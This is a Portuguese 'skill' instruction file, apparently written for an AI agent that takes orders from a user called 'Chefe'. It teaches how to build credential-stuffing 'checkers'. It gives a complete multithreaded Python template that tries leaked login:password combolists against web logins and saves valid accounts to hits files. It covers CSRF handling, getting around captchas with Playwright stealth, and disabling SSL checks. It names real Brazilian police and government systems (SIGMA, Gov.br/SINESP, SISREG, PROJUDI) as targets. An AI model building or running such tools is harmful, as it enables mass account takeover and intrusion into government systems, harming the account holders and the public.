# Skill: Checker de Combolist

> **Quando usar:** Quando o Chefe pedir para fazer checker de algum site ou sistema.

---

## 🎯 Objetivo

Criar um checker Python robusto, rápido e visualmente profissional para validar credenciais (combolist) contra sistemas web.

---

## 📁 Estrutura de Arquivos

```
 checker_<site>.py    # Código principal do checker
 combos.txt          # Combolist: login:senha (um por linha)
 hits.txt            # Credenciais válidas encontradas
```

**⚠️ IMPORTANTE:** Nunca criar arquivos na área de trabalho. Sempre usar diretórios organizados dentro do projeto.

---

## 🔧 Fluxo de Desenvolvimento

### 1. Reconhecimento do Alvo

Antes de codificar, acesse a URL do sistema e:

1. **Analise o formulário de login:**
   - Campos: username/email/CPF, password
   - Método HTTP: POST/GET
   - Headers especiais (CSRF tokens, cookies)

2. **Teste com credenciais inválidas:**
   - Envie login: `teste123` senha: `teste123`
   - Capture a resposta (HTML/JSON)
   - Identifique mensagem de erro

3. **Teste com credencial válida (se disponível):**
   - Capture o comportamento de sucesso
   - Note redirecionamentos
   - Identifique tokens/sessões

### 2. Arquitetura do Checker

```python
# Estrutura base
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
from rich.console import Console
from rich.progress import Progress
import time

# Configurações
THREADS = 50              # Workers simultâneos
TIMEOUT = 10              # Segundos por requisição
RETRY = 3                 # Tentativas em caso de erro de rede
```

### 3. Banner ASCII Profissional

```python
from pyfiglet import Figlet
from colorama import Fore

def show_banner(site_name, cor_principal=Fore.CYAN):
    """
    Cria banner degradê com nome do site.
    Se não especificada cor, usa cor principal do site alvo.
    """
    f = Figlet(font='slant')
    banner = f.renderText(site_name)
    
    # Degradê simples
    cores = [Fore.BLUE, Fore.CYAN, Fore.GREEN, Fore.YELLOW]
    lines = banner.split('\n')
    colored = []
    for i, line in enumerate(lines):
        cor = cores[i % len(cores)]
        colored.append(cor + line)
    
    return '\n'.join(colored) + Style.RESET_ALL
```

### 4. Core do Checker

```python
import requests
import re
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class Checker:
    def __init__(self, url, threads=50):
        self.url = url
        self.threads = threads
        self.hits = []
        self.invalid = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.session = self._create_session()
        
    def _create_session(self):
        """Session otimizada com retries e connection pooling"""
        session = requests.Session()
        retry = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=retry
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session
    
    def check_credential(self, username, password):
        """
        Método principal - deve ser sobrescrito para cada site.
        Retorna: 'HIT', 'INVALID', 'ERROR'
        """
        try:
            data = {
                'username': username,
                'password': password
            }
            
            response = self.session.post(
                self.url,
                data=data,
                timeout=10,
                allow_redirects=True
            )
            
            # Lógica de validação específica do site
            if self._is_success(response):
                return 'HIT'
            elif self._is_invalid(response):
                return 'INVALID'
            else:
                return 'ERROR'
                
        except requests.exceptions.Timeout:
            return 'ERROR'
        except requests.exceptions.ConnectionError:
            return 'ERROR'
        except Exception:
            return 'ERROR'
    
    def _is_success(self, response):
        """Detecta login bem-sucedido"""
        # Exemplos de checks:
        # - Redirecionamento para dashboard
        # - Token na resposta
        # - Mensagem específica
        # - Status code 200 com conteúdo específico
        pass
    
    def _is_invalid(self, response):
        """Detecta credencial inválida"""
        # Exemplos:
        # - "Invalid credentials"
        # - "Login failed"
        # - Status 401/403
        pass
```

### 5. Multi-threading com Controle

```python
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.progress import Progress, TextColumn, BarColumn, TimeRemainingColumn

def run_checker(checker, combolist_file):
    """
    Executa o checker com controle de threads e progresso visual.
    """
    # Carregar combos
    with open(combolist_file, 'r') as f:
        combos = [line.strip() for line in f if ':' in line]
    
    total = len(combos)
    start_time = time.time()
    
    with Progress(
        TextColumn("[bold blue]{task.description}"),
        BarColumn(bar_width=40),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("[green]✓ {task.fields[hits]}"),
        TextColumn("[red]✗ {task.fields[invalid]}"),
        TextColumn("[yellow]⚠ {task.fields[errors]}"),
        TimeRemainingColumn(),
        console=Console()
    ) as progress:
        
        task = progress.add_task(
            "Verificando...",
            total=total,
            hits=0,
            invalid=0,
            errors=0
        )
        
        with ThreadPoolExecutor(max_workers=checker.threads) as executor:
            futures = {
                executor.submit(
                    checker.check_credential,
                    combo.split(':')[0],
                    combo.split(':')[1]
                ): combo for combo in combos
            }
            
            for future in as_completed(futures):
                combo = futures[future]
                try:
                    result = future.result()
                    
                    if result == 'HIT':
                        with checker.lock:
                            checker.hits.append(combo)
                            progress.update(task, hits=len(checker.hits))
                    elif result == 'INVALID':
                        with checker.lock:
                            checker.invalid += 1
                            progress.update(task, invalid=checker.invalid)
                    else:
                        with checker.lock:
                            checker.errors += 1
                            progress.update(task, errors=checker.errors)
                            
                except Exception as e:
                    with checker.lock:
                        checker.errors += 1
                        progress.update(task, errors=checker.errors)
                
                progress.update(task, advance=1)
    
    # Salvar hits
    with open('hits.txt', 'w') as f:
        for hit in checker.hits:
            f.write(f"{hit}\n")
    
    # Resumo final
    elapsed = time.time() - start_time
    show_summary(total, len(checker.hits), checker.invalid, checker.errors, elapsed)

def show_summary(total, hits, invalid, errors, elapsed):
    """Exibe resumo colorido no terminal"""
    console = Console()
    console.print("\n" + "="*50)
    console.print(f"[bold cyan]📊 RESUMO FINAL[/bold cyan]")
    console.print("="*50)
    console.print(f"[white]Total processado:[/white] {total}")
    console.print(f"[green]✓ Válidos (HITS):[/green] {hits}")
    console.print(f"[red]✗ Inválidos:[/red] {invalid}")
    console.print(f"[yellow]⚠ Erros de rede:[/yellow] {errors}")
    console.print(f"[cyan]⏱ Tempo decorrido:[/cyan] {elapsed:.1f}s")
    console.print(f"[cyan]⚡ Velocidade:[/cyan] {total/elapsed:.0f} checks/segundo")
    console.print("="*50)
```

---

## 🎨 Cores e Estilo Visual

### Paleta Padrão (Colorama)

```python
from colorama import Fore, Style

# Sucesso
HIT_COLOR = Fore.GREEN + Style.BRIGHT
# Falha  
INVALID_COLOR = Fore.RED
# Erro de rede/timeout
ERROR_COLOR = Fore.YELLOW
# Info
INFO_COLOR = Fore.CYAN
# Banner
BANNER_COLORS = [Fore.BLUE, Fore.CYAN, Fore.GREEN, Fore.YELLOW, Fore.MAGENTA]
```

### Rich Console (opcional avançado)

```python
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

console = Console()

# Painel estilizado
def log_hit(credential):
    console.print(Panel(
        f"[bold green]✓ LOGIN VÁLIDO[/bold green]\n[white]{credential}[/white]",
        border_style="green"
    ))
```

---

## 🔍 Padrões de Detecção por Tipo de Sistema

### Sistemas com Redirecionamento

```python
def _is_success(self, response):
    # Login OK = redirect para /dashboard, /home, /account
    return response.status_code == 302 and '/dashboard' in response.headers.get('Location', '')

def _is_invalid(self, response):
    # Login fail = permanece na página ou redirect para /login?error
    return response.status_code == 200 or '/login' in response.url
```

### APIs JSON

```python
def _is_success(self, response):
    try:
        data = response.json()
        return data.get('success') == True or 'token' in data
    except:
        return False

def _is_invalid(self, response):
    try:
        data = response.json()
        return 'error' in data or data.get('success') == False
    except:
        return 'invalid' in response.text.lower()
```

### Sistemas com CSRF Token

```python
def get_csrf_token(self):
    """Extrai token CSRF da página de login"""
    resp = self.session.get(self.url)
    # Regex ou BeautifulSoup
    match = re.search(r'name="csrf_token" value="([^"]+)"', resp.text)
    return match.group(1) if match else None

def check_credential(self, user, pwd):
    token = self.get_csrf_token()
    data = {
        'username': user,
        'password': pwd,
        'csrf_token': token
    }
    # ... resto do código
```

---

## 📊 Tratamento de Categorias

| Categoria | Quando Usar | Ação |
|-----------|-------------|------|
| **HIT** | Login bem-sucedido, acesso confirmado | Salvar em `hits.txt` |
| **INVALID** | Credencial rejeitada pelo sistema | Contar apenas |
| **ERROR** | Timeout, connection error, 5xx | Retry automático |
| **2FA/OTP** | Login OK mas requer 2º fator | Salvar em `hits_2fa.txt` |
| **BLOQUEADA** | Conta suspensa/bloqueada | Salvar em `hits_blocked.txt` |

---

## ⚡ Otimizações

### Connection Pooling

```python
# Reutilizar conexões TCP
session = requests.Session()
adapter = HTTPAdapter(
    pool_connections=50,    # Conexões iniciais
    pool_maxsize=100,       # Máximo por host
    max_retries=Retry(total=2)
)
```

### Thread-local Sessions

```python
import threading

class ThreadSafeChecker:
    def __init__(self):
        self._local = threading.local()
    
    @property
    def session(self):
        if not hasattr(self._local, 'session'):
            self._local.session = requests.Session()
        return self._local.session
```

---

## 🚀 Exemplo Completo: Template Base

```python
#!/usr/bin/env python3
"""
Checker Template - <NOME_DO_SITE>
Uso: python checker_<site>.py
"""

import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from rich.console import Console
from rich.progress import Progress, TextColumn, BarColumn, TimeRemainingColumn
from pyfiglet import Figlet

init(autoreset=True)

class SiteChecker:
    def __init__(self):
        self.url = "https://site.com/login"
        self.threads = 50
        self.timeout = 10
        self.hits = []
        self.invalid = 0
        self.errors = 0
        self.lock = threading.Lock()
        
    def show_banner(self):
        f = Figlet(font='slant')
        banner = f.renderText("SITE CHECKER")
        print(Fore.CYAN + banner + Style.RESET_ALL)
        print(Fore.YELLOW + "="*60 + Style.RESET_ALL)
        print(f"{Fore.CYAN}Alvo:{Style.RESET_ALL} {self.url}")
        print(f"{Fore.CYAN}Threads:{Style.RESET_ALL} {self.threads}")
        print(f"{Fore.CYAN}Timeout:{Style.RESET_ALL} {self.timeout}s")
        print(Fore.YELLOW + "="*60 + Style.RESET_ALL + "\n")
    
    def check(self, username, password):
        try:
            session = requests.Session()
            data = {'user': username, 'pass': password}
            
            resp = session.post(
                self.url,
                data=data,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # Lógica específica do site
            if resp.status_code == 302:
                return 'HIT'
            elif 'invalid' in resp.text.lower():
                return 'INVALID'
            else:
                return 'ERROR'
                
        except requests.exceptions.Timeout:
            return 'ERROR'
        except Exception:
            return 'ERROR'
    
    def run(self, combo_file='combos.txt'):
        self.show_banner()
        
        with open(combo_file, 'r') as f:
            combos = [l.strip() for l in f if ':' in l]
        
        console = Console()
        start = time.time()
        
        with Progress(
            TextColumn("[bold blue]{task.description}"),
            BarColumn(),
            TextColumn("{task.percentage:>3.0f}%"),
            TextColumn("[green]{task.fields[hits]} hits"),
            TextColumn("[red]{task.fields[invalid]} inválidos"),
            TimeRemainingColumn(),
            console=console
        ) as progress:
            
            task = progress.add_task(
                "Verificando",
                total=len(combos),
                hits=0,
                invalid=0
            )
            
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = {
                    ex.submit(self.check, c.split(':')[0], c.split(':')[1]): c 
                    for c in combos
                }
                
                for future in as_completed(futures):
                    combo = futures[future]
                    try:
                        result = future.result()
                        
                        if result == 'HIT':
                            with self.lock:
                                self.hits.append(combo)
                                progress.update(task, hits=len(self.hits))
                                console.print(f"[green]✓ HIT:[/green] {combo}")
                        elif result == 'INVALID':
                            with self.lock:
                                self.invalid += 1
                                progress.update(task, invalid=self.invalid)
                    except:
                        with self.lock:
                            self.errors += 1
                    
                    progress.update(task, advance=1)
        
        # Salvar e resumir
        with open('hits.txt', 'w') as f:
            f.write('\n'.join(self.hits))
        
        elapsed = time.time() - start
        console.print(f"\n[bold cyan]Resumo:[/bold cyan]")
        console.print(f"Total: {len(combos)} | Hits: {len(self.hits)} | Inválidos: {self.invalid} | Erros: {self.errors}")
        console.print(f"Tempo: {elapsed:.1f}s | Velocidade: {len(combos)/elapsed:.0f}/s")

if __name__ == '__main__':
    checker = SiteChecker()
    checker.run()
```

---

## 🔍 Análise de Formato de Login — SEMPRE VERIFICAR!

**Antes de criar qualquer checker, analisar o campo de usuário/login:**

| Tipo de Site | Formato Aceito | Como Identificar | Filtro de Combolist |
|--------------|----------------|------------------|---------------------|
| **SIGMA (Polícia Civil MA)** | CPF (11 dígitos) | Label "CPF" ou campo `name="cpf"` | `len(user.replace('.','').replace('-','')) == 11 and user.replace('.','').replace('-','').isdigit()` |
| **Gov.br / SINESP** | CPF (11 dígitos) | Placeholder "000.000.000-00" | Mesmo filtro acima |
| **M365 / Outlook** | Email | Label "Email" ou campo `type="email"` | `'@' in user and '.' in user.split('@')[1]` |
| **WordPress** | Username/Email | Aceita ambos | Não filtrar |
| **SISREG** | CPF ou CNS | Dois campos possíveis | Verificar CPF (11) ou CNS (15) |
| **PROJUDI** | OAB + UF ou CPF | Label específico | Manter todos, testar ambos |

### Função Padrão para Limpar Combolist

```python
def limpar_combolist(lines, tipo='cpf'):
    '''
    Limpa combolist: remove duplicados e filtra por formato.
    tipo: 'cpf', 'email', 'ambos', 'todos'
    Retorna: lista limpa
    '''
    result = []
    seen = set()
    
    for line in lines:
        if ':' not in line:
            continue
        
        user = line.split(':', 1)[0].strip()
        clean_cpf = user.replace('.', '').replace('-', '').replace(' ', '')
        is_cpf = len(clean_cpf) == 11 and clean_cpf.isdigit()
        is_email = '@' in user and '.' in user.split('@')[-1]
        
        # Filtrar conforme tipo
        if tipo == 'cpf' and not is_cpf:
            continue
        elif tipo == 'email' and not is_email:
            continue
        elif tipo == 'ambos' and not (is_cpf or is_email):
            continue
        
        # Normalizar chave para deduplicação
        key = clean_cpf if is_cpf else user.lower()
        
        if key not in seen:
            seen.add(key)
            result.append(line)
    
    return result

# USO:
with open('combolist.txt', 'r') as f:
    lines = [l.strip() for l in f if ':' in l]

# Para SIGMA (apenas CPFs):
limpa = limpar_combolist(lines, tipo='cpf')
print(f"Original: {len(lines)} | Após limpar: {len(limpa)}")
```

---

## ⚡ Regras de Ouro para Checkers

1. **SEMPRE limpar combolist ANTES de rodar:**
   - Remover duplicados (normalizar CPF/email pra comparação)
   - Filtrar por formato válido (CPF=11 dígitos, email=tem @)
   - Informar Chefe: "Original: X | Após limpar: Y"

2. **SEMPRE analisar página de login primeiro:**
   - Acessar URL e verificar campos (`usuario`, `cpf`, `email`)
   - Verificar método HTTP (GET/POST)
   - Capturar CSRF token se existir
   - Testar UMA credencial manualmente antes de automatizar

3. **SEMPRE ignorar SSL para sites .gov:**
   ```python
   import urllib3
   urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
   session = requests.Session()
   session.verify = False  # Ignora certificado inválido
   ```

4. **SEMPRE salvar em tempo real:**
   ```python
   with open('hits.txt', 'a') as f:
       f.write(f"{credencial}\n")
       f.flush()  # FORÇA escrita imediata no disco!
   ```

5. **SEMPRE usar delays:**
   ```python
   import random
   time.sleep(random.uniform(1.0, 3.0))  # Sites gov: 1-3s
   ```

6. **SEMPRE evitar emojis no terminal Windows:**
   - Usar `[INFO]`, `[HIT]`, `[DIE]` em vez de 🎯 💀
   - Evita `UnicodeEncodeError: 'charmap' codec can't encode`

---

## 🎭 Playwright vs Requests — Quando Usar

| Situação | Ferramenta | Motivo |
|----------|------------|--------|
| Formulário simples | **Requests** | Mais rápido, menos recursos |
| SSL inválido | **Requests + verify=False** | Ignora certificado |
| JavaScript dinâmico | **Playwright** | Renderiza JS |
| Captcha / anti-bot | **Playwright + stealth** | Simula navegador |
| Precisa ver interação | **Playwright visible** | Chefe vê o navegador |
| Muitas credenciais | **Requests + threads** | Performance |

---

## 🎯 Indicadores de Sucesso/Falha

**HIT (login válido):**
- `'dashboard'`, `'portal'`, `'bem-vindo'`, `'logout'`
- URL mudou pra `/admin`, `/user`, `/home`
- Status 200 + sem formulário de login na resposta

**DIE (login inválido):**
- `'senha incorreta'`, `'login inválido'`, `'usuário não encontrado'`
- `'erro de autenticação'`, `'credenciais inválidas'`
- `'acesso negado'`, `'inválido'`, `'invalid'`

**⚠️ Falsos Positivos:**
- `'painel de acesso'` — pode ser página de login
- `'formulario'`, `'<form'` — ainda tem formulário = falha
- URL igual ao de login = provavelmente falha

---

## ✅ Checklist Pré-Checker (Atualizado)

- [ ] **Identificar formato de login** (CPF/email/user)
- [ ] **Limpar combolist** (remover duplicados + filtrar formato)
- [ ] **Testar uma credencial manualmente** antes de automatizar
- [ ] **Verificar SSL** (precisa ignorar?)
- [ ] **Definir indicadores HIT/DIE** específicos do site
- [ ] **Configurar delays** (1-3s para sites gov)
- [ ] **Preparar arquivos de saída** (hits.txt, dies.txt, errors.txt)
- [ ] **Adicionar `.flush()`** em todos os writes
- [ ] **Definir timeout** (15-30s para sites gov)

---

## 📝 Notas de Implementação

- Sempre usar `with open()` para manipular arquivos
- Nunca expor credenciais em logs (mostrar apenas parcial)
- Respeitar rate limits - usar delays se necessário
- Thread-safe: usar `threading.Lock()` para contadores compartilhados
- Connection pooling é essencial para performance
- Colorama + Rich = visual profissional
